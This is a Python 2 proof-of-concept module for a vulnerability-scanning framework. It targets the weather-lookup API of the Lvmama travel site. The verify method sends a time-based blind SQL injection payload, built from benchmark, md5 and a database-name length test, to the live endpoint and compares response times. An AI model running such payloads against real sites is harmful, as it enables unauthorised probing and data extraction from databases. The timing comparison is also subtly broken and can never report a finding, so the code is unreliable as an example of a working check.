# coding:utf-8
import time
from CScanPoc.thirdparty import requests
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType


class Vuln(ABVuln):
    vuln_id = 'Lvmama_0101'  # 平台漏洞编号
    name = '驴妈妈主站接口注入'  # 漏洞名称
    level = VulnLevel.HIGH  # 漏洞危害级别
    type = VulnType.INJECTION  # 漏洞类型
    disclosure_date = '2016-06-19'  # 漏洞公布时间
    desc = '''
    驴妈妈主站接口注入漏洞，攻击者可以通过构造恶意语句来读取系统敏感文件信息。
    '''  # 漏洞描述
    ref = 'Unknown'  # 漏洞来源
    cnvd_id = 'Unknown'  # cnvd漏洞编号
    cve_id = 'Unknown'  # cve编号
    product = 'Lvmama(驴妈妈)'  # 漏洞组件名称
    product_version = 'Unknown'  # 漏洞应用版本


class Poc(ABPoc):
    poc_id = 'a1cb5fdc-953e-4936-b044-8c915dc8cf62'  # 平台 POC 编号
    author = 'hyhmnn'  # POC编写者
    create_date = '2018-06-26'  # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())

    def verify(self):
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))
            payload = "/weather/api/getWeatherByName?name=%E5%8C%97%E4%BA%AC%2527aND(1=if(length/**/(database/**/())=12,1,benchmark/**/(7000000,md5(1))))aND%25271%2527=%25271&callback=jQuery172013711762335151434_1461556777871"
            payload1 = "/weather/api/getWeatherByName?name=%E5%8C%97%E4%BA%AC&callback=jQuery172013711762335151434_1461556777871"

            url = self.target + payload
            start_time1 = time.time()
            _response = requests.get(url)

            url = self.target + payload1
            end_time1 = time.time()
            _response = requests.get(url)
            end_time2 = time.time()
            if (end_time1-start_time1) - (end_time2-start_time1) >= 2:
                self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                    target=self.target, name=self.vuln.name))
        except Exception, e:
            self.output.info('执行异常：{}'.format(e))

    def exploit(self):
        self.verify()


if __name__ == '__main__':
    Poc().run()
